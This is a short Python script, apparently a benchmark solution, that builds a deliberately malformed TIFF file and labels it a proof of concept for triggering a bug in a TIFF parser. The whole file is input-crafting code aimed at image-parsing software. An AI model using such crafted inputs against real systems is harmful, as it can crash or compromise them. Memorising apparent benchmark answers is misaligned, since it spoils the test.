import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'\x49\x49\x2A\x00\x00\x00\x00\x08'
        num_entries = struct.pack('<H', 12)
        entries = b''
        for i in range(12):
            tag_id = i
            tag_type = 1  # BYTE
            count = 5
            offset = 0
            entries += struct.pack('<HHII', tag_id, tag_type, count, offset)
        next_ifd = struct.pack('<I', 0)
        poc = header + num_entries + entries + next_ifd
        poc += b'\x00' * 4
        return poc
